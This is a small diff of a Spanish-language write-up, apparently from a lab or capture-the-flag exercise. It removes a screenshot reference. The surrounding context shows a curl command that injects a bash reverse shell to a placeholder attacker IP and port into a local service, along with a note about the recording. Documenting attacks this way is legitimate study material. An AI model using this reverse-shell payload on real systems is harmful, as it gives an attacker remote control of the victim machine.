@@ -129,8 +129,6 @@ curl -G http://localhost:9999/ --data-urlencode \
   "cmd=bash -i >& /dev/tcp/<IP-atacante>/<puerto> 0>&1"
 ```
 
-![El envío desde la terminal: la línea queda cortada por el ancho de la ventana](evidencia/revshell-curl.png)
-
 > En la grabación el comando completo no cabe en la terminal: se ve el arranque
 > (`curl -G http://localhost:9999/ --data-urlencode "cmd= …`) y justo después la conexión que
 > llega al escucha. El comando íntegro es el del bloque de arriba.
